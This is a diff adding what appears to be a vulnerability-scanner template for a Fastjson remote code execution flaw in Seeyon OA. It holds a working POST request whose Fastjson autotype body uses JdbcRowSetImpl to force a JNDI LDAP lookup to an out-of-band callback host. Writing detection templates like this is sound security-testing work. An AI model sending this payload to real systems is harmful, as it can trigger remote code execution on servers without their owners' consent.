@@ -1,0 +1,31 @@
+id: seeyon-oa-fastjson-rce
+brief:
+    title: Seeyon OA Fastjson Remote Code Execution
+    by: SleepingBag945
+    level: critical
+    about: Seeyon OA Fastjson is vulnerable to RCE.
+    label:
+        - seeyon
+        - oa
+        - rce
+        - fastjson
+        - oast
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/seeyon/main.do?method=changeLocale'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+      body: _json_params={"v47":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"xxx":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{{interactsh-url}}","autoCommit":true}}
+      signs:
+        - "on": word
+          has:
+            - dns
+          in: interactsh_protocol
+          need: all
+        - "on": word
+          has:
+            - com.alibaba.fastjson.JSONException
+          in: body
+          need: all
